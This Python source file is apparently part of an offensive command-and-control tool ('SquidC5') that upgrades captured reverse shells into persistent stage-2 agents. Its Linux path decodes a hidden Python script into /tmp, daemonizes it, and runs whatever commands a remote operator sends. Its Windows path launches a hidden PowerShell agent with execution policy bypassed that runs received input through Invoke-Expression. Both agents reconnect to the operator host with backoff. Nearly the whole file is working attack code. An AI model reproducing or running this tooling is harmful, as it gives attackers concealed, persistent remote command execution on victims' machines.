"""
Auto-stabilize fragile reverse shells with platform stage-2 agents.

Linux  -> reconnecting command executor (reliable line-based)
Windows -> PowerShell reconnecting command executor

Deterministic templates only - no free-form generation.
"""

from __future__ import annotations

import base64
import re
import secrets
from dataclasses import dataclass
from typing import Literal

OsFamily = Literal["linux", "windows", "unknown"]


@dataclass
class StabilizePlan:
    os_family: OsFamily
    commands: list[str]
    method: str
    notes: str


OS_MARKER = "SC5_OS="
STABLE_BANNER = "SC5_STABLE"
PROBE_CMD = (
    f"echo {OS_MARKER}$(uname -s 2>/dev/null); "
    f"echo {OS_MARKER}%OS% 2>nul; "
    f"echo {OS_MARKER}$env:OS 2>$null; "
    f"ver 2>nul"
)


def detect_os(blob: str) -> OsFamily:
    text = blob or ""
    upper = text.upper()
    for m in re.finditer(rf"{re.escape(OS_MARKER)}([^\r\n]+)", text, re.I):
        val = m.group(1).strip().upper()
        if "WINDOWS" in val or val.startswith("WIN"):
            return "windows"
        if any(x in val for x in ("LINUX", "DARWIN", "FREEBSD", "OPENBSD", "UNIX")):
            return "linux"
        if "CYGWIN" in val or "MSYS" in val:
            return "windows"
    if "MICROSOFT WINDOWS" in upper or "WINDOWS_NT" in upper:
        return "windows"
    if re.search(r"\b(LINUX|UBUNTU|DEBIAN|CENTOS|DARWIN|GNU)\b", upper):
        return "linux"
    if re.search(r"PS [A-Z]:\\", text) or "PS C:\\" in text:
        return "windows"
    if re.search(r"(bash-|\$ |# )", text) and "C:\\" not in text:
        return "linux"
    return "unknown"


def _b64(script: str) -> str:
    return base64.b64encode(script.encode("utf-8")).decode("ascii")


def linux_stage2_script(host: str, port: int) -> str:
    """
    Line-oriented reconnecting executor.

    More reliable than PTY for C2 operator use: each line is run via shell=True
    and stdout/stderr is returned. Avoids silent PTY echo-only zombies.
    """
    return f'''#!/usr/bin/env python3
# SquidC5 stage-2 stable reverse shell (authorized testing only)
import os, sys, time, socket, subprocess, threading, queue
HOST, PORT = {host!r}, {int(port)}
BACKOFF, MAX_BACKOFF = 3, 30

def _run_session(s):
    try:
        s.sendall(b"SC5_STABLE_LINUX\\n")
    except Exception:
        return
    buf = b""
    s.settimeout(180.0)
    while True:
        try:
            chunk = s.recv(8192)
        except socket.timeout:
            # keepalive tick - stay connected
            try:
                s.sendall(b"")
            except Exception:
                return
            continue
        except Exception:
            return
        if not chunk:
            return
        buf += chunk
        while b"\\n" in buf:
            line, buf = buf.split(b"\\n", 1)
            cmd = line.decode("utf-8", "replace").strip("\\r").strip()
            if not cmd:
                continue
            # Built-in ping for C2 liveness probes
            if cmd.startswith("SC5_PING "):
                token = cmd.split(" ", 1)[1].strip()
                try:
                    s.sendall(("SC5_PONG " + token + "\\n").encode())
                except Exception:
                    return
                continue
            try:
                p = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    timeout=120,
                    executable="/bin/bash" if os.path.exists("/bin/bash") else None,
                )
                out = p.stdout or b""
                err = p.stderr or b""
                data = out + err
                if not data:
                    data = b""
                if not data.endswith(b"\\n"):
                    data += b"\\n"
                s.sendall(data)
            except subprocess.TimeoutExpired:
                try:
                    s.sendall(b"[sc5] command timeout\\n")
                except Exception:
                    return
            except Exception as e:
                try:
                    s.sendall(("[sc5] error: " + str(e) + "\\n").encode())
                except Exception:
                    return

def main():
    delay = BACKOFF
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
            except (AttributeError, OSError):
                pass
            s.settimeout(20)
            s.connect((HOST, PORT))
            s.settimeout(None)
            delay = BACKOFF
            _run_session(s)
        except Exception:
            pass
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass
        time.sleep(delay)
        delay = min(delay * 2, MAX_BACKOFF)

if __name__ == "__main__":
    try:
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
    except Exception:
        pass
    for fd in (0, 1, 2):
        try:
            os.close(fd)
        except Exception:
            pass
    main()
'''


def _safe_host(host: str) -> str:
    """H13: only allow hostname/IP chars for PowerShell interpolation."""
    import re

    h = (host or "").strip()
    if not re.fullmatch(r"[A-Za-z0-9._:-]{1,253}", h):
        raise ValueError("invalid public_host for stage-2")
    return h


def windows_stage2_script(host: str, port: int) -> str:
    """PowerShell reconnecting line executor with SC5_PING support."""
    safe = _safe_host(host)
    return f'''
$ErrorActionPreference = 'SilentlyContinue'
$h = '{safe}'
$p = {int(port)}
$delay = 3
while ($true) {{
  try {{
    $c = New-Object System.Net.Sockets.TCPClient($h, $p)
    $c.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket,
      [System.Net.Sockets.SocketOptionName]::KeepAlive, $true)
    $s = $c.GetStream()
    $s.ReadTimeout = 180000
    $s.WriteTimeout = 180000
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true
    $r = New-Object System.IO.StreamReader($s)
    $w.WriteLine("SC5_STABLE_WIN")
    $delay = 3
    while ($c.Connected) {{
      try {{
        $cmd = $r.ReadLine()
        if ($null -eq $cmd) {{ break }}
        $cmd = $cmd.Trim()
        if ($cmd -eq '') {{ continue }}
        if ($cmd.StartsWith('SC5_PING ')) {{
          $tok = $cmd.Substring(9).Trim()
          $w.WriteLine('SC5_PONG ' + $tok)
          continue
        }}
        try {{
          $out = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
        }} catch {{
          $out = $_.Exception.Message
        }}
        if (-not $out.EndsWith("`n")) {{ $out = $out + "`n" }}
        $w.Write($out)
      }} catch {{ break }}
    }}
    try {{ $c.Close() }} catch {{}}
  }} catch {{}}
  Start-Sleep -Seconds $delay
  if ($delay -lt 30) {{ $delay = [Math]::Min($delay * 2, 30) }}
}}
'''.strip()


class ShellStabilizer:
    """Build deterministic stage-2 inject commands for a captured shell."""

    def __init__(self, public_host: str, public_port: int) -> None:
        self.public_host = public_host
        self.public_port = public_port

    def probe_command(self) -> str:
        return PROBE_CMD

    def plan(self, os_family: OsFamily) -> StabilizePlan:
        if os_family == "windows":
            return self._windows_plan()
        if os_family == "linux":
            return self._linux_plan()
        # Prefer Linux first; avoid dual-inject storms
        return self._linux_plan()

    def _linux_plan(self) -> StabilizePlan:
        script = linux_stage2_script(self.public_host, self.public_port)
        b64 = _b64(script)
        tok = secrets.token_hex(4)
        cmds = [
            (
                f"F=/tmp/.sc5_{tok}.py; "
                f"echo {b64} | base64 -d > \"$F\" 2>/dev/null; "
                f"chmod 700 \"$F\" 2>/dev/null; "
                f"(nohup python3 \"$F\" >/dev/null 2>&1 & ) || "
                f"(nohup python \"$F\" >/dev/null 2>&1 & ); "
                f"echo SC5_STAGE2_LINUX_LAUNCHED"
            ),
        ]
        return StabilizePlan(
            os_family="linux",
            commands=cmds,
            method="python_stage2_line_exec",
            notes="Linux: background reconnecting line-executor agent",
        )

    def _windows_plan(self) -> StabilizePlan:
        ps = windows_stage2_script(self.public_host, self.public_port)
        enc = base64.b64encode(ps.encode("utf-16le")).decode("ascii")
        cmds = [
            (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {enc}; "
                f"echo SC5_STAGE2_WIN_LAUNCHED"
            ),
        ]
        return StabilizePlan(
            os_family="windows",
            commands=cmds,
            method="powershell_stage2_line_exec",
            notes="Windows: hidden PowerShell reconnecting line executor",
        )
